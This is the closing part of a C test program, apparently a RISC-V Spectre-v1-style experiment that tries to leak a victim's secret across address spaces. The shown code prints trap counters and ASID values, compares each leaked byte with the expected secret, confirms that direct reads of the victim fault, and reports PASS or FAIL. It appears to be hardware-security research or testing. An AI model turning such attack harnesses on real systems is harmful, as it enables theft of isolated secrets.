  printf("[v1-asid-priv] satp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx asid_mask=0x%lx\n",
         attacker_space.satp, victim_space.satp,
         observed_attacker_satp, observed_victim_satp, SATP_ASID_MASK);
  printf("[v1-asid-priv] traps=%lu victim_calls=%lu victim_done=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
         trap_count, victim_call_count, victim_done_count, flush_call_count,
         exit_call_count, bad_trap_count, last_mcause, (void *)last_mepc,
         attack_status);

  int leak_ok = 1;
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    uint8_t guess = leaked_idx[i][0];
    uint8_t second = leaked_idx[i][1];
    uint8_t expected = victim_region.secret[SECRET_OFFSET + i];
    printf("[v1-asid-priv] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v1-asid-priv] byte %lu rounds=%lu early_stop=%d min_score=%d gap=%d\n",
           i, rounds_used[i], EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
    (void)second;
    if (guess != expected)
      leak_ok = 0;
  }

  int isolation_ok = direct_victim_fault_seen != 0 &&
                     direct_victim_read_completed == 0 &&
                     ((observed_attacker_satp & SATP_ASID_MASK) !=
                      (observed_victim_satp & SATP_ASID_MASK));
  int pass = (attack_status == 0 && bad_trap_count == 0 &&
              victim_call_count != 0 && victim_done_count == victim_call_count &&
              isolation_ok && leak_ok);
  printf("[v1-asid-priv] check=%s\n", pass ? "PASS" : "FAIL");
  return pass ? 0 : 1;
}
